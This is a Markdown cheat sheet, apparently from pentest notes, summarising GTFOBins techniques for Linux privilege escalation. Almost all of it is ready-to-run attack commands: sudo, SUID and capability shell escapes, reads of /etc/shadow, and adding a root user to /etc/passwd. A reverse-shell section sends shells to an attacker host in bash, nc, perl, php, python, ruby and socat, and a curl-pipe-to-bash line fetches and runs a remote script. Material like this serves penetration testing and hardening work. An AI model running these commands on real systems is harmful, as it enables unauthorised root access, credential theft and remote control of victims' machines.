# GTFOBins - Linux Privilege Escalation

## Table of Contents

- [Overview](#overview)
- [SUDO Exploits](#sudo-exploits)
- [SUID Exploits](#suid-exploits)
- [Capabilities Exploits](#capabilities-exploits)
- [File Read](#file-read)
- [File Write](#file-write)
- [Reverse Shells](#reverse-shells)
- [Shell Escape](#shell-escape)

---

## Overview

GTFOBins is a curated list of Unix binaries that can be exploited to bypass local security restrictions. This is a quick reference for the most commonly used techniques.

**Full Reference:** <https://gtfobins.github.io/>

**Contexts:**

- **Sudo** - Binary can be run as root via sudo
- **SUID** - Binary has SUID bit set
- **Capabilities** - Binary has specific Linux capabilities

---

## SUDO Exploits

### Find Sudo Permissions

```shell
sudo -l
```

### awk

```shell
sudo awk 'BEGIN {system("/bin/bash")}'
```

### bash

```shell
sudo bash
```

### cp

```shell
# Copy /etc/passwd to writable location, modify, copy back
LFILE=/etc/passwd
sudo cp /etc/passwd /tmp/passwd.bak
# Edit and add user, then copy back
```

### curl

```shell
# Read file
sudo curl file:///etc/shadow

# Download and execute
sudo curl http://$lhost/shell.sh | bash
```

### docker

```shell
sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

### ed

```shell
sudo ed
!/bin/bash
```

### env

```shell
sudo env /bin/bash
```

### find

```shell
sudo find . -exec /bin/bash \; -quit
```

### ftp

```shell
sudo ftp
!/bin/bash
```

### gcc

```shell
sudo gcc -wrapper /bin/bash,-s .
```

### gdb

```shell
sudo gdb -nx -ex '!bash' -ex quit
```

### git

```shell
sudo git -p help config
!/bin/bash
```

### gzip / gunzip

```shell
# Read file
sudo gzip -f /etc/shadow -t
```

### journalctl

```shell
sudo journalctl
!/bin/bash
```

### less

```shell
sudo less /etc/passwd
!/bin/bash
```

### man

```shell
sudo man man
!/bin/bash
```

### more

```shell
sudo more /etc/passwd
!/bin/bash
```

### mysql

```shell
sudo mysql -e '\! /bin/bash'
```

### nano

```shell
sudo nano
^R^X
reset; bash 1>&0 2>&0
```

### nmap

```shell
# Old nmap (< 5.21)
sudo nmap --interactive
nmap> !sh

# New nmap
TF=$(mktemp)
echo 'os.execute("/bin/bash")' > $TF
sudo nmap --script=$TF
```

### perl

```shell
sudo perl -e 'exec "/bin/bash";'
```

### php

```shell
sudo php -r "system('/bin/bash');"
```

### python / python3

```shell
sudo python -c 'import os; os.system("/bin/bash")'
sudo python3 -c 'import os; os.system("/bin/bash")'
```

### ruby

```shell
sudo ruby -e 'exec "/bin/bash"'
```

### rsync

```shell
sudo rsync -e 'bash -c "bash 0<&2 1>&2"' 127.0.0.1:/dev/null
```

### sed

```shell
sudo sed -n '1e exec bash 1>&0' /etc/hosts
```

### ssh

```shell
sudo ssh -o ProxyCommand=';bash 0<&2 1>&2' x
```

### tar

```shell
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
```

### tee

```shell
# Write to file
echo "data" | sudo tee /root/.ssh/authorized_keys
```

### vim / vi

```shell
sudo vim -c ':!/bin/bash'
sudo vi -c ':!/bin/bash'
```

### wget

```shell
# Write file
TF=$(mktemp)
chmod +x $TF
echo -e '#!/bin/bash\n/bin/bash' > $TF
sudo wget --use-askpass=$TF 0
```

### zip

```shell
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'bash #'
```

---

## SUID Exploits

### Find SUID Binaries

```shell
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
```

### Common SUID Exploits

#### SUID bash

```shell
/bin/bash -p
```

#### SUID cp

```shell
# Overwrite /etc/passwd
LFILE=/etc/passwd
./cp /tmp/malicious_passwd $LFILE
```

#### SUID find

```shell
./find . -exec /bin/sh -p \; -quit
```

#### nmap (< 5.21)

```shell
./nmap --interactive
nmap> !sh
```

#### SUID php

```shell
./php -r "pcntl_exec('/bin/sh', ['-p']);"
```

#### SUID python

```shell
./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

#### vim

```shell
./vim -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
```

---

## Capabilities Exploits

### Find Capabilities

```shell
getcap -r / 2>/dev/null
```

### Common Capability Exploits

#### cap_setuid

> python with cap_setuid

```shell
./python -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

> perl with cap_setuid

```shell
./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
```

#### cap_dac_read_search

> tar with cap_dac_read_search (read any file)

```shell
./tar cvf shadow.tar /etc/shadow
./tar xvf shadow.tar
cat etc/shadow
```

#### cap_dac_override

> vim with cap_dac_override (write any file)

```shell
./vim /etc/passwd
# Add root user
```

#### cap_net_raw

> tcpdump with cap_net_raw

```shell
./tcpdump -i lo -w /tmp/capture.pcap
```

#### cap_sys_admin

> python with cap_sys_admin

```shell
# Mount host filesystem from container
./python -c 'import os; os.system("mount /dev/sda1 /mnt; chroot /mnt /bin/bash")'
```

---

## File Read

### Binaries for Reading Files

```shell
# cat alternatives
base64 /etc/shadow | base64 -d
xxd /etc/shadow | xxd -r
od -An -c /etc/shadow
hexdump -C /etc/shadow

# Using sudo
sudo awk '{print}' /etc/shadow
sudo sed '' /etc/shadow
sudo head /etc/shadow
sudo tail /etc/shadow
sudo nl /etc/shadow
sudo sort /etc/shadow
sudo uniq /etc/shadow
sudo cut -d: -f1 /etc/shadow
sudo grep "" /etc/shadow
sudo diff /etc/shadow /dev/null
```

---

## File Write

### Binaries for Writing Files

```shell
# tee
echo "content" | sudo tee /target/file

# dd
echo "content" | sudo dd of=/target/file

# cp
sudo cp /source/file /target/file

# mv
sudo mv /source/file /target/file
```

### Add Root User to /etc/passwd

```shell
# Generate password hash
openssl passwd -1 -salt evil password123
# Result: $1$evil$xyz...

# Add to /etc/passwd
echo 'evil:$1$evil$xyz...:0:0:root:/root:/bin/bash' | sudo tee -a /etc/passwd

# Login as evil user
su evil
```

---

## Reverse Shells

### bash Reverse Shell

```shell
sudo bash -i >& /dev/tcp/$lhost/$lport 0>&1
```

### nc / netcat

```shell
sudo nc -e /bin/bash $lhost $lport

# Without -e
sudo rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc $lhost $lport > /tmp/f
```

### perl Reverse Shell

```shell
sudo perl -e 'use Socket;$i="$lhost";$p=$lport;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### php Reverse Shell

```shell
sudo php -r '$sock=fsockopen("$lhost",$lport);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### python Reverse Shell

```shell
sudo python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$lhost",$lport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### ruby Reverse Shell

```shell
sudo ruby -rsocket -e'f=TCPSocket.open("$lhost",$lport).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### socat

```shell
# Attacker (listener)
socat file:`tty`,raw,echo=0 tcp-listen:$lport

# Victim
sudo socat tcp-connect:$lhost:$lport exec:/bin/bash,pty,stderr,setsid,sigint,sane
```

---

## Shell Escape

### Escaping Restricted Shells

```shell
# Check current shell
echo $SHELL
echo $0

# Try different escapes
/bin/bash
/bin/sh
bash -i
sh -i

# Using commands
awk 'BEGIN {system("/bin/bash")}'
python -c 'import pty; pty.spawn("/bin/bash")'
perl -e 'exec "/bin/bash";'
vi -c ':!/bin/bash'
```

### Escaping rbash (Restricted Bash)

```shell
# Method 1: Use absolute path
/bin/bash

# Method 2: Via BASH_CMDS
BASH_CMDS[a]=/bin/bash;a

# Method 3: Via SSH
ssh user@localhost /bin/bash

# Method 4: Via Python
python -c 'import os; os.system("/bin/bash")'

# Method 5: Via Vim
vim -c ':set shell=/bin/bash' -c ':shell'
```

---

## Quick Reference

### Most Common SUDO Escapes

| Binary | Command |
| :--- | :--- |
| vim | `sudo vim -c ':!/bin/bash'` |
| find | `sudo find . -exec /bin/bash \; -quit` |
| python | `sudo python -c 'import os; os.system("/bin/bash")'` |
| less | `sudo less /etc/passwd` then `!/bin/bash` |
| nmap | `sudo nmap --script=/tmp/shell.nse` |
| awk | `sudo awk 'BEGIN {system("/bin/bash")}'` |
| perl | `sudo perl -e 'exec "/bin/bash";'` |
| env | `sudo env /bin/bash` |

### Environment Variables

```shell
# Override PATH for command hijacking
export PATH=/tmp:$PATH

# LD_PRELOAD (if env_keep)
# Compile: gcc -fPIC -shared -o /tmp/preload.so /tmp/preload.c -nostartfiles
sudo LD_PRELOAD=/tmp/preload.so <program>
```

---

## ðŸ“š See Also

### Related Privilege Escalation

- **[Privilege Escalation Linux](4.2.Privilege-Escalation-Linux.md)** - Complete Linux privesc methodology
- **[Linux Command](../6.OS-Command/6.2.Linux-command.md)** - Linux enumeration and system commands

### Reverse Shells & Exploitation

- **[Reverse Shell](../6.OS-Command/6.3.Reverse-Shell.md)** - Payload generation for SUDO/SUID abuse
- **[Command Injection](../7.Web-Exploit/7.4.Command-Injection.md)** - Web-based command execution
